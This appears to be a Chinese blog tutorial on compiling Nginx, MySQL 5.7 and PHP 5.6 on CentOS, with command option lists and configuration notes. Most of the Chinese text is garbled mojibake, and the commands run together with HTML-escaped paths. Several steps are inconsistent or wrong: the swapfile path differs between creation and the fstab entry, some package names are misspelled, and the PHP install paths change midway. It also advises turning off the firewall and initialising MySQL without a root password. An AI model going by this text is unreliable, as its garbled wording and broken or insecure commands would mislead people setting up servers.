--follow follow trailing symbolic links when checking file existence (default)-h, --help æ˜¾ç¤ºå¸®åŠ©-i, --ignore-case å¿½ç•¥å¤§å°å†™-l, --limit, -n LIMIT limit output (or counting) to LIMIT entries-m, --mmap ignored, for backward compatibility-P, --nofollow, -H don&#39;t follow trailing symbolic links when checking file existence-0, --null separate entries with NUL on output-S, --statistics don&#39;t search for entries, print statistics about eachused database-q, --quiet å®‰é™æ¨¡å¼ï¼Œä¸ä¼šæ˜¾ç¤ºä»»ä½•é”™è¯¯è®¯æ¯-r, --regexp REGEXP ä½¿ç”¨åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ --regex ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼-s, --stdio ignored, for backward compatibility-V, --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯-w, --wholename match whole path name (default) tarå‘½ä»¤å‚æ•°:-z ï¼šæ˜¯å¦åŒæ—¶å…·æœ‰ gzip çš„å±æ€§ï¼Ÿäº¦å³æ˜¯å¦éœ€è¦ç”¨ gzip å‹ç¼©æˆ–è§£å‹ï¼Ÿ ä¸€èˆ¬æ ¼å¼ä¸ºxx.tar.gzæˆ–xx. tgz -v ï¼šå‹ç¼©çš„è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ–‡ä»¶ï¼ -f ï¼šä½¿ç”¨æ–‡ä»¶åï¼Œè¯·ç•™æ„ï¼Œåœ¨ f ä¹‹åè¦ç«‹å³æ¥æ–‡ä»¶åï¼ -cï¼š åˆ›å»ºæ–°çš„æ¡£æ¡ˆæ–‡ä»¶ã€‚å¦‚æœç”¨æˆ·æƒ³å¤‡ä»½ä¸€ä¸ªç›®å½•æˆ–æ˜¯ä¸€äº›æ–‡ä»¶ï¼Œå°±è¦é€‰æ‹©è¿™ä¸ªé€‰é¡¹ã€‚ç›¸å½“äºæ‰“åŒ…ã€‚ -xï¼š ä»æ¡£æ¡ˆæ–‡ä»¶ä¸­é‡Šæ”¾æ–‡ä»¶ã€‚ç›¸å½“äºæ‹†åŒ…ã€‚ -tï¼š åˆ—å‡ºæ¡£æ¡ˆæ–‡ä»¶çš„å†…å®¹ï¼ŒæŸ¥çœ‹å·²ç»å¤‡ä»½äº†å“ªäº›æ–‡ä»¶ã€‚ vimåŸºæœ¬å‘½ä»¤ECS æ™®é€šæ¨¡å¼ i æ’å…¥ w å†™å…¥ï¼Œå¾—æœ‰æƒé™ q é€€å‡º dd åˆ é™¤æ•´è¡Œ / åé¢åŠ å­—ç¬¦ï¼Œè¿›è¡ŒæŸ¥æ‰¾ netstat -t : æŒ‡æ˜æ˜¾ç¤ºTCPç«¯å£ -u : æŒ‡æ˜æ˜¾ç¤ºUDPç«¯å£ -l : ä»…æ˜¾ç¤ºç›‘å¬å¥—æ¥å­—(æ‰€è°“å¥—æ¥å­—å°±æ˜¯ä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿè¯»å†™ä¸æ”¶å‘é€šè®¯åè®®(protocol)ä¸èµ„æ–™çš„ç¨‹åº) -p : æ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œç¨‹åºåç§°ï¼Œæ¯ä¸€ä¸ªå¥—æ¥å­—/ç«¯å£éƒ½å±äºä¸€ä¸ªç¨‹åºã€‚ -n : ä¸è¿›è¡ŒDNSè½®è¯¢ï¼Œæ˜¾ç¤ºIP(å¯ä»¥åŠ é€Ÿæ“ä½œ) åŸºæœ¬å‘½ä»¤yum å®‰è£…åŒ…ç®¡ç†å·¥å…· kill æ€è¿›ç¨‹ cd ç§»åŠ¨è·¯å¾„ make ç¼–è¯‘ make install å®‰è£… locate æŸ¥æ‰¾æ–‡ä»¶è·¯å¾„ cmake æœ‰äº›æ–‡ä»¶éœ€è¦å…ˆcmakeæ‰èƒ½ç¼–è¯‘å®‰è£… cp å¤åˆ¶ rm åˆ é™¤ mv å¯ç”¨äºé‡å‘½å ls ç›¸å½“äºcmdçš„dir groupadd æ·»åŠ ç”¨æˆ·ç»„ useradd æ·»åŠ ç”¨æˆ· screen å¯ä»¥é˜²æ­¢æ–­ç½‘ç¼–è¯‘å¤±è´¥(æˆ‘è¿˜ä¸ä¼šç”¨) netstat -ntlp 2.å®‰è£…å¼€å‘åŒ…å’Œåº“æ–‡ä»¶//æˆ‘é‡‡ç”¨é˜¿é‡Œäº‘å†™çš„ä¸€é”®å®‰è£…è„šæœ¬ï¼ŒåŒ…å«æ‰€æœ‰åº“ï¼Œä¸ç”¨å†å»æ‰¾äº†ï¼Œçœäº‹ã€‚ 1yum -y install ntp make openssl openssl-devel pcre pcre-devel libpng libpng-devel libjpeg-6b libjpeg-devel-6b freetype freetype-devel gd gd-devel zlib zlib-devel gcc gcc-c++ libXpm libXpm-devel ncurses ncurses-devel libmcrypt libmcrypt-devel libxml2 libxml2-devel imake autoconf automake screen sysstat compat-libstdc++-33 curl curl-devel opensll zlib //HTTP æ‰“åŒ…å‹ç¼©è§£å‹ç­‰åŠŸèƒ½ pcre //è¿™ä¸ªåŒ…ä¸»è¦ç”¨æ¥HTTP rewrite //nginxéœ€è¦ gccbisonbison-develzlib-devellibmcrypt-develmcryptmhash-developenssl-devellibxml2-devellibcurl-develbzip2-develreadline-devellibedit-develsqlite-devel phpéœ€è¦ 3.Nginx1.å®‰è£…1234567891011121314151617181920212223242526272829mkdir &#x2F;usr&#x2F;local&#x2F;downloads #æ–°å»ºæ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾ä¸‹è½½çš„ä¸œè¥¿ï¼Œä¸ªäººä¹ æƒ¯ln -s &#x2F;usr&#x2F;local&#x2F;downloads &#x2F; #åœ¨rootä¸‹æ·»åŠ è½¯é“¾æ¥ï¼Œç›¸å½“äºWindowsçš„å¿«æ·æ–¹å¼#1. ä¸‹è½½nginxå®‰è£…åŒ…wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.11.11.tar.gz#2. è§£å‹å®‰è£…åŒ…tar -zxvf nginx-1.11.11.tar.gz#3. é‡å‘½åæ–‡ä»¶å¤¹mv nginx-1.11.11 nginx#4. é…ç½®configureçš„åˆå§‹ç›®å½•(æˆ‘çš„ç†è§£å³å®‰è£…ç›®å½•)cd nginx #å…ˆè¿›å…¥åˆ°nginxå®‰è£…åŒ…ä¸­.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx #prefixå‰ç½®ç›®å½•ä¸èƒ½æ˜¯å®‰è£…åŒ…æ‰€åœ¨çš„ç›®å½•ï¼Œå¦åˆ™ä¼šå‡ºé”™## æ‰§è¡Œå‘½ä»¤åï¼Œç³»ç»Ÿå¼€å§‹æ£€æŸ¥å®‰è£…æ‰€éœ€çš„ä¾èµ–æ–‡ä»¶ï¼Œè‹¥å‡ºç°ERROERæ˜¯ç¼ºå°‘ä¾èµ–åº“ï¼Œyumä¸€ä¸‹ç¼ºå°‘çš„å³å¯#è¿™é‡Œå†™çš„å‚æ•°æ¯”è¾ƒå°‘ï¼Œå¯ä»¥å°è¯•å†™å¤š#5. ç¼–è¯‘å®‰è£…nginxmake #ç¼–è¯‘make install #å®‰è£…#6. æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸcd &#x2F;usr&#x2F;local ##åœ¨localé‡Œé¢çœ‹åˆ°äº†nginxæ–‡ä»¶å¤¹cd nginx ##è¿›å…¥åˆ°nginxæ–‡ä»¶å¤¹çœ‹åˆ°æœ‰conf html logs sbin æ–‡ä»¶å¤¹#è®¿é—® http:&#x2F;&#x2F;localhost&#x2F; å¯ä»¥çœ‹åˆ°Welcome to nginx!è¯´æ˜å®‰è£…æˆåŠŸï¼Œè‹¥ä¸èƒ½ï¼Œåˆ™å°è¯•æŸ¥çœ‹æœåŠ¡å™¨æ§åˆ¶å°http 80ç«¯å£æ˜¯å¦æ‰“å¼€ï¼Œæ˜¯å¦æœ‰é˜²ç«å¢™ï¼Ÿå…³é—­ã€‚è‹¥è¿˜æ˜¯ä¸èƒ½ï¼Œåˆ«æ€¥ï¼Œå…ˆè¿›å…¥ä¸‹ä¸€æ­¥ä¿®æ”¹é…ç½®æ–‡ä»¶ln -s &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;bin ##åœ¨biné‡Œé¢æ·»åŠ nginxå‘½ä»¤ï¼Œè¿™æ ·å°±ä¸éœ€è¦æ¯æ¬¡å¯åŠ¨éƒ½è¦é€šè¿‡&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginxæ¥å¯åŠ¨ 2.nginxçš„æ‰€æœ‰æ–‡ä»¶ç›®å½•ä½ç½®1234567891011121314151617181920212223242526272829303132###1ã€å®‰è£…åŒ…æ–‡ä»¶æ‰€åœ¨ï¼š&#x2F;usr&#x2F;local&#x2F;downloads&#x2F;nginx ###æ–°å¢æ¨¡å—ï¼Œç¼–è¯‘éƒ½è¦é€šè¿‡.&#x2F;configureè¿›è¡Œ###2ã€ä¸»è¦æ–‡ä»¶å¤¹: &#x2F;usr&#x2F;local&#x2F;nginx | |+conf #é…ç½®æ–‡ä»¶å¤¹ - nginx.conf # nginxçš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œä¸»è¦é…ç½® ## åŠ¨æ€æœåŠ¡å™¨é…ç½®æ–‡ä»¶ - fastcgi.conf # FastCGIé…ç½®æ–‡ä»¶,ä¸»è¦è´Ÿè´£nginxä¸phpæ•°æ®ä¼ é€’(ä½œç”¨è§Tip1) - fastcgi_params # FastCGIçš„ä¸»è¦é…ç½®æ–‡ä»¶(å’Œfastcgi.confåŒºåˆ«è§Tip2) - uwsgi_params # ç±»ä¼¼FastCGI,ç”¨æ¥éƒ¨ç½²pythonæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ - scgi_params # scgi çš„é…ç½®æ–‡ä»¶,ç±»ä¼¼FastCGIã€‚ ## æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨ - mime.types # mime.typesæ˜¯æ–‡ä»¶ç±»å‹çš„è®¾ç½®é…ç½®æ–‡ä»¶ã€‚ ## ç¼–ç è½¬æ¢æ˜ å°„æ–‡ä»¶ï¼Œä¸»è¦æ˜¯è¾“å‡ºå†…å®¹è½¬ç  - win-utf # windows-1251 &lt;--&gt; utf-8 - koi-utf # koi8-r &lt;--&gt; utf-8 - koi-win # koi8-r &lt;--&gt; windows-1251 |+html #ç½‘é¡µæ ¹ç›®å½•æ–‡ä»¶å¤¹ -50x.html #50xé”™è¯¯é¡µé¢ -index.html #ä¸»é¡µ |-logs #æ—¥å¿—æ–‡ä»¶å¤¹ - error.log #é”™è¯¯æ—¥å¿— - access.log #ç™»å½•æ—¥å¿— - nginx.pid #nginxçš„pid |-sbin #å‘½ä»¤æ–‡ä»¶å¤¹ - nginx #å¯åŠ¨å‘½ä»¤ |+client_body_temp # \\ |+proxy_temp # --\\ å„ç±»ä¸´æ—¶ |+scgi_temp # --&#x2F; æ–‡ä»¶ |+uwsgi_temp # &#x2F; 3.nginxçš„çš„åŸºç¡€å‘½ä»¤12345678910111213141516171819202122232425262728### 0ã€æŸ¥çœ‹nginxä¸»è¿›ç¨‹å·ps -aux | grep nginxki### 1ã€å¯åŠ¨nginxå‰ï¼Œå…ˆæµ‹è¯•é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡® nginx -t #### é»˜è®¤æµ‹è¯• &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf é…ç½®æ–‡ä»¶ï¼› nginx -t -c **&#x2F;nginx.conf #### æµ‹è¯•ä½ æƒ³è¦çš„nginxé…ç½®æ–‡ä»¶ï¼› ### 2ã€å¯åŠ¨nginx nginx .&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nginx### 3ã€åœæ­¢nginx (ä¸€èˆ¬é€šè¿‡-s å‘é€ä¿¡å·çš„æ–¹å¼) nginx -s stop&#x2F;quit #### (*æ¨è*)###### çŸ¥é“äº†ä¸»è¿›ç¨‹å·åï¼Œå¯ä»¥é€šè¿‡æ€è¿›ç¨‹æ–¹å¼åœæ­¢nginxkill -QUIT pid #### ä»å®¹åœæ­¢kill -TERM pid #### å¿«é€Ÿåœæ­¢kill -9 pid #### å‰ç½®åœæ­¢### 4ã€é‡å¯nginx, ä¿®æ”¹.conf é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯ nginx -s reloadkill -HUP pid&#x2F;path #### é€šè¿‡nginxçš„è¿›ç¨‹å·å¹³æ»‘é‡å¯### 5ã€åˆ¶å®šé…ç½®æ–‡ä»¶ -c nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf### 6ã€æŸ¥çœ‹nginxç‰ˆæœ¬nginx -v ####ç‰ˆæœ¬å·nginx -V ####è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯ *4.nginxçš„æ–°å¢æ¨¡å— 1ï¼ŒæŸ¥çœ‹nginxçš„ç‰ˆæœ¬çš„ä¿¡æ¯çŠ¶è¯­ä»å¥ï¼šæ¨¡å—ä¿¡æ¯nginx -Væ˜¾ç¤ºä¿¡æ¯ï¼š 123nginx version: nginx&#x2F;1.11.12built by gcc 4.8.5 (Red Hat 4.8.5-11)(GCC)configure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx 2ï¼ŒæŸ¥çœ‹nginxçš„å¯ç”¨çš„æ¨¡å—å±•ç¤ºè¿›å…¥åˆ°å®‰è£…æ–‡ä»¶å¤¹æ•°ï¼ˆåœ¨/ usr /æœ¬åœ°/ä¸‹è½½/ nginxçš„ï¼‰./configure --helpæ˜¾ç¤ºä¸€å †ä¸-HTTP â€¦..ä¹‹ç±»çš„ï¼Œè¿™äº›éƒ½æ˜¯å¯ä»¥å®‰è£…çš„æ¨¡å— 3ï¼Œè¦è¾“å…¥ä¾§å®‰è£…æ¨¡å—./configure --prefix=/usr/local/nginx --with... #æƒ³è¦åŠ ä»€ä¹ˆæ¨¡å—ï¼Œåœ¨åé¢åŠ ä»€ä¹ˆå¦‚ï¼š./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_stub_status_module 4ï¼Œæ–°å¢æ¨¡å—makemake install 5ï¼Œæ£€æŸ¥æ–°å¢æ˜¯å¦æˆåŠŸnginx -V #å¦‚æœåé¢çš„configure argumentsæœ‰äº†ä½ è¦çš„å‚æ•°ï¼Œåˆ™æ·»åŠ æˆåŠŸ 5.å¼€æœºè‡ªå¯åŠ¨//æ¬ ç€ï¼Œè¿˜æ²¡æ‰¾åˆ°å¥½çš„ï¼Œè‡ªå·±åˆä¸ä¼šå†™ï¼Œèœçš„æ‰£è„š 6.é…ç½®1234567891011vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf #æœ‰ä¸¤ä¸ªï¼Œdefaulté‚£ä¸ªç”¨ä½œé˜²æ­¢é…ç½®é”™è¯¯çš„å¤‡ä»½#é«˜ç‰ˆæœ¬ä¼šç›‘å¬ipv6ç«¯å£ï¼Œipv4å’Œipv6éƒ½ä½¿ç”¨80ç«¯å£ï¼Œä¼šå¯¼è‡´å ç”¨ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°â€œ:â€ä½ç½®ï¼Œå¹¶è¾“å…¥ddå‘½ä»¤ï¼Œåˆ é™¤æ­¤è¡Œ#é˜¿é‡Œäº‘æœåŠ¡å™¨éœ€è¦æŠŠserver_name:è¿™ä¸€è¡Œä¿®æ”¹ä¸ºserver_name: _;#è¿˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆ#æ²¡æœ‰å†™è„šæœ¬ï¼Œæ‰€ä»¥é‡å¯å•¥çš„ä¼šæœ‰ç‚¹å‘ï¼Œæˆ‘çš„è§£å†³åŠæ³•ç›´æ¥killæ‰è¿›ç¨‹ï¼Œç„¶åå†å¯åŠ¨ã€‚killall -9 nginxnginx start#å†è®¿é—®http:&#x2F;&#x2F;ip,åº”è¯¥å¯ä»¥æ˜¾ç¤ºwelcome to nginxäº† 4.Mysql(å¯èƒ½è£…å®Œè¿˜æ˜¯æœ‰bugï¼Œå¯ä»¥æ‰¾å…¶ä»–æ•™ç¨‹å•ç‹¬è£…ï¼Œé—®é¢˜ä¸å¤§)1.ç¼–è¯‘å®‰è£…123456789101112131415161718192021222324252627wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;MySQL-5.7&#x2F;mysql-boost-5.7.17.tar.gzè§£å‹å®‰è£…åŒ…å¹¶é‡å‘½åtar -zxvf mysql-boost-5.7.17.tar.gzæŸ¥çœ‹æ˜¯å¦å·²ç»æœ‰my.cnf é…ç½®æ–‡ä»¶locate my.cnfmv my.cnf my.cnf.backupåˆ›å»ºæ–‡ä»¶å®‰è£…ç›®å½•mkdir &#x2F;usr&#x2F;local&#x2F;mysqlmkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;dataå»ºç«‹ç»„å’Œç”¨æˆ·groupadd mysqluseradd -r -g mysql -s &#x2F;bin&#x2F;false mysqlç¼–è¯‘cd &#x2F;root&#x2F;downloads&#x2F;mysql-5.7.17cmake -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql -DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data -DDEFAULT_CHARSET&#x3D;utf8mb4 -DDEFAULT_COLLATION&#x3D;utf8mb4_general_ci -DEXTRA_CHARSETS&#x3D;all -DENABLED_LOCAL_INFILE&#x3D;1 -DWITH_BOOST&#x3D;boost#å¦‚æœç¼–è¯‘å‡ºé”™ï¼Œå‘ç”Ÿcmake errorï¼Œé‚£å°±çœ‹çœ‹é”™è¯¯ä¿¡æ¯ï¼Œç¼ºå°‘å“ªä¸ªä¾èµ–å°±yum installå“ªä¸ªï¼Œç”±äºå…ˆå‰æœ‰ä¸‹è½½ä¾èµ–åº“ï¼Œåº”è¯¥é—®é¢˜ä¸å¤§ï¼Œå‚æ•°è§£é‡Šç±»æ¯”äºnginxé…ç½®æ–‡ä»¶å®‰è£…makemake install å¯èƒ½å‡ºç°çš„é—®é¢˜ 12345678910111213141516171819202122#å¦‚æœmakeçš„æ—¶å€™ï¼Œåˆ°40%å¤šå¯èƒ½ä¼šæŠ¥ä¸‹é¢çš„é”™ï¼šc++: ç¼–è¯‘å™¨å†…éƒ¨é”™è¯¯ï¼šå·²æ€æ­»(ç¨‹åº cc1plus)Please submit a full bug report,with preprocessed source if appropriate.See &lt;http:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;bugzilla&gt; for instructions.make[2]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;item_geofunc.cc.o] é”™è¯¯ 4make[1]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;all] é”™è¯¯ 2make: *** [all] é”™è¯¯ 2#[åŸå› æ˜¯ï¼šhttp:&#x2F;&#x2F;blog.csdn.net&#x2F;cryhelyxx&#x2F;article&#x2F;details&#x2F;47610247]#åŸå› æ˜¯å†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œå…·ä½“è§£å†³æªæ–½æ˜¯ï¼šdd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;swapfile bs&#x3D;1k count&#x3D;2048000 #è·å–è¦å¢åŠ çš„2Gçš„SWAPæ–‡ä»¶å—mkswap &#x2F;swapfile #åˆ›å»ºSWAPæ–‡ä»¶swapon &#x2F;swapfile #æ¿€æ´»SWAPæ–‡ä»¶swapon -s #æŸ¥çœ‹SWAPä¿¡æ¯æ˜¯å¦æ­£ç¡®echo &quot;&#x2F;var&#x2F;swapfile swap swap defaults 0 0&quot; &gt;&gt; &#x2F;etc&#x2F;fstab #æ·»åŠ åˆ°fstabæ–‡ä»¶ä¸­è®©ç³»ç»Ÿå¼•å¯¼æ—¶è‡ªåŠ¨å¯åŠ¨#æ³¨æ„, swapfileæ–‡ä»¶çš„è·¯å¾„åœ¨&#x2F;var&#x2F;ä¸‹ #ç¼–è¯‘å®Œå, å¦‚æœä¸æƒ³è¦äº¤æ¢åˆ†åŒºäº†, å¯ä»¥åˆ é™¤:swapoff &#x2F;swapfilerm -fr &#x2F;swapfile 2.é…ç½®123456789101112131415161718192021222324252627282930313233343536373839è®¾ç½®ç›®å½•æƒé™cd &#x2F;usr&#x2F;local&#x2F;mysqlchown -R root:mysql . #æŠŠå½“å‰ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ‰€æœ‰è€…è®¾ä¸ºrootï¼Œæ‰€å±ç»„ä¸ºmysqlchown -R mysql:mysql dataå¤åˆ¶é…ç½®æ–‡ä»¶cp support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnfåˆå§‹åŒ–mysqlï¼Œå¼€å¯sslbin&#x2F;mysqld --initialize-insecure --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;databin&#x2F;mysql_ssl_rsa_setup --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;dataè®¾ç½®å¼€æœºè‡ªå¯åŠ¨cp &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqlchmod +x &#x2F;etc&#x2F;init.d&#x2F;mysqlchkconfig --add mysqlchkconfig mysql onä¿®æ”¹é…ç½®æ–‡ä»¶vim &#x2F;etc&#x2F;my.cnf#é…ç½®æ–‡ä»¶é‡Œé¢å¯èƒ½æ²¡æœ‰è¿™äº›å‚æ•°ï¼Œè‡ªå·±åŠ å°±å¥½ï¼Œ&gt;&gt;&gt;ll[mysqld]datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;datadefault-storage-engine&#x3D;MyISAMlog-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.piduser &#x3D; mysqltmpdir &#x3D; &#x2F;tmp&lt;&lt;&lt;#å‚æ•°è§£é‡Šdatadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data &#x2F;&#x2F;æ•°æ®åº“å­˜æ”¾ä½ç½®default-storage-engine&#x3D;MyISAM &#x2F;&#x2F;å­˜å‚¨å¼•æ“log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log &#x2F;&#x2F;é”™è¯¯æ—¥å¿—å†™å…¥çš„åœ°æ–¹ pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid &#x2F;&#x2F;å¯åŠ¨mysqlä¼šæŒ‚è½½pidï¼Œpidæ˜¯å•¥åé¢æœ‰ä»‹ç»user &#x3D; mysqltmpdir &#x3D; &#x2F;tmp 5.PHP1.ç¼–è¯‘å®‰è£…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116##ä¸€é”®å®‰è£…yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-fpm php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml#è·å–å®‰è£…åŒ…wget http:&#x2F;&#x2F;120.52.51.15&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-5.6.35.tar.gz#è§£å‹tar -zxvf php-5.6.35.tar.gz#è¿›å…¥ç›®å½•cd php-5.6.35#åˆ›å»ºç”¨æˆ·groupadd nginxuseradd -g nginx -s &#x2F;sbin&#x2F;nologin -M nginx#éœ€è¦æ·»åŠ é™¤rootä»¥å¤–çš„ç”¨æˆ·æ¥è¿è¡Œphp-fpmï¼Œæ·»åŠ ç”¨æˆ·è¦ä¸ä¸‹é¢é…ç½®å‚æ•°å¯¹åº”ä¿®æ”¹ï¼Œä¸ç„¶é…ç½®å®Œï¼Œå†æ¥ä¿®æ”¹å®¹æ˜“å‡ºé”™ä¸”éº»çƒ¦#å»ºè®®å…ˆyumä¸€ä¸‹è¿™ä¸¤ä¸ªåº“ï¼Œå…ˆä¸å¼„ä¹Ÿè¡Œï¼Œ.&#x2F;configureä¹‹åæŠ¥é”™å†å¼„ä¹Ÿè¡Œyum search readlineyum install redline-devel.å•¥å•¥å•¥ &#x2F;&#x2F;searchå®Œåä¼šæœ‰ä¸€äº›å¯å®‰è£…åŒ…ï¼Œæ‰¾åˆ°develå’Œé€‚åˆçš„ç‰ˆæœ¬yum search BZip2 yum install BZip2-devel.å•¥å•¥å•¥ &#x2F;&#x2F;ä¸€æ ·çš„# ç¼–è¯‘é…ç½®.&#x2F;configure \\--prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php \\--with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc \\--enable-inline-optimization \\--disable-debug \\--disable-rpath \\--enable-shared \\--enable-opcache \\--enable-fpm \\--with-fpm-user&#x3D;nginx \\--with-fpm-group&#x3D;nginx \\--with-mysql&#x3D;mysqlnd \\--with-mysqli&#x3D;mysqlnd \\--with-pdo-mysql&#x3D;mysqlnd \\--with-gettext \\--enable-mbstring \\--with-iconv \\--with-mcrypt \\--with-mhash \\--with-openssl \\--enable-bcmath \\--enable-soap \\--with-libxml-dir \\--enable-pcntl \\--enable-shmop \\--enable-sysvmsg \\--enable-sysvsem \\--enable-sysvshm \\--enable-sockets \\--with-curl \\--with-zlib \\--enable-zip \\--with-bz2 \\--with-readline##å‚æ•°è§£é‡Š# å®‰è£…ç›®å½•--prefix# é…ç½®æ–‡ä»¶php.iniä½ç½®--with-config-file-path# ä¼˜åŒ–é€‰é¡¹--enable-inline-optimization--disable-debug--disable-rpath--enable-shared# å¯ç”¨opcache--enable-opcache# é…ç½®php-fpm--enable-fpm--with-fpm-user--with-fpm-group# é…ç½®MySQL--with-mysql--with-mysqli--with-pdo-mysql# å›½é™…åŒ–ä¸å­—ç¬¦ç¼–ç æ”¯æŒ--with-gettext--enable-mbstring--with-iconv# åŠ å¯†--with-mcrypt--with-mhash--with-openssl# æ•°å­¦æ‰©å±•--enable-bcmath# Web æœåŠ¡ï¼Œsoap ä¾èµ– libxml--enable-soap--with-libxml-dir# è¿›ç¨‹ï¼Œä¿¡å·åŠå†…å­˜--enable-pcntl--enable-shmop--enable-sysvmsg--enable-sysvsem--enable-sysvshm# socket &amp; curl--enable-sockets--with-curl# å‹ç¼©ä¸å½’æ¡£--with-zlib--enable-zip--with-bz2# GNU Readline å‘½ä»¤è¡Œå¿«æ·é”®ç»‘å®š--with-readline# å¦‚æœæç¤ºERRORç¼ºäº†å•¥ä¾èµ–åŒ…ï¼Œéœ€è¦å®‰è£…# åæ­£æŠ¥å•¥é”™å°±å¢åŠ å•¥ï¼Œç†è®ºä¸Šæ˜¯éƒ½æ·»åŠ å¥½äº†##æ·»åŠ ä¾èµ–åŒ…#å¦‚æœæŠ¥é”™æ·»åŠ ä»¥ä¸‹å‘½ä»¤#yum install libxml2-devel bzip2-devel libcurl-devel libmcrypt-devel readline-develç¼–è¯‘å®‰è£…makemake install 2.é…ç½®1234567891011121314151617181920212223242526#å¤åˆ¶é…ç½®æ–‡ä»¶(å®‰è£…åŒ…ä½ç½®&#x2F;usr&#x2F;lcoal&#x2F;downloads&#x2F;php-5.6.0)1.phpé…ç½®æ–‡ä»¶php.iniupdatedb #æ›´æ–°locateæ•°æ®åº“ï¼Œå­˜å‚¨äº†ä½ç½®locate php.ini# å®‰è£…åŒ…å†…çš„php.inié…ç½®æ–‡ä»¶æœ‰ä¸¤ä¸ªï¼š## 1.php.ini-production å®‰å…¨æ€§è¾ƒé«˜ï¼Œä¸€èˆ¬ç”¨äºç”Ÿäº§## 2.php.ini-development ä¸€èˆ¬ç”¨äºå¼€å‘# å› ä¸ºç¬¬äºŒä¸ªæ¯”ç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„é”™è¯¯ä¿¡æ¯æ›´å¤šä¼šæš´éœ²ç”¨æˆ·ä¸€äº›ä¿¡æ¯ï¼Œ# æ‰€ä»¥ä¸€èˆ¬äº§å“è¦æ­£å¼ä½¿ç”¨çš„è¯å»ºè®®ç”¨productionï¼Œè¦ç”¨å“ªä¸ªå°±å¤åˆ¶å“ªä¸ªä¸ºphp.inicp &#x2F;åˆšåˆšçš„è·¯å¾„&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc&#x2F;php.ini 2.php-fpmé…ç½®æ–‡ä»¶php-fpm.confcd &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etccp php-fpm.conf.default php-fpm.conf3.å¤åˆ¶å¯åŠ¨è„šæœ¬cd &#x2F;downloads&#x2F;php-5.6.30&#x2F;sapi&#x2F;fpmcp init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpmchmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpmln -s &#x2F;usr&#x2F;local&#x2F;php56&#x2F;sbin&#x2F;php-fpm &#x2F;usr&#x2F;local&#x2F;bin#å¿«æ·å‘½ä»¤4.è®¾ç½®php-fpmå¼€æœºè‡ªå¯åŠ¨chkconfig --add php-fpmchkconfig php-fpm on 